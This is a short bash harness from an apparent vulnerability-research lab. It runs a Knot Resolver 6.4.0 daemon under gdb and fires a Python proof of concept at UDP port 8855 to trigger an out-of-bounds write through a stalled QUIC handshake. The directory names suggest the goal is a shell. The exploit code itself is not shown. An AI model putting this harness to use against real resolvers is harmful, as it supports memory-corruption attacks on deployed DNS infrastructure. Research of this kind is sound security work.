#!/bin/bash
# Loopback-only: F6 OOB write while an extra connection's Initial pktns is
# held live by a stalled handshake.  Usage: run_pktns_stalled.sh [nstall]
set +e
BASE=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell
KRESD="$BASE/build/knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd"
EVID="$BASE/harness/pktns-stalled.txt"
NSTALL="${1:-1}"
: > "$EVID"
pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
pkill -9 -f 'pktns-owner.gdb' 2>/dev/null
sleep 1
gdb -q -batch -x "$BASE/harness/pktns-owner.gdb" "$KRESD" \
  > "$BASE/harness/pktns-stalled-stdout.log" 2>&1 &
GB=$!
echo "[runner] gdb pid=$GB nstall=$NSTALL"
sleep 8
ss -lun | grep 8855 || echo "no 8855 socket yet"
"$BASE/poc/venv/bin/python" "$BASE/harness/ksl_stalled.py" 8855 "$NSTALL" 2>&1
sleep 8
kill -9 $GB 2>/dev/null
sleep 1
echo "=== pktns-stalled oracle ==="
cat "$BASE/harness/pktns-owner-direct.txt" > "$EVID"
cat "$EVID"
echo "=== gdb stdout tail ==="
tail -20 "$BASE/harness/pktns-stalled-stdout.log"
echo "=== END ==="
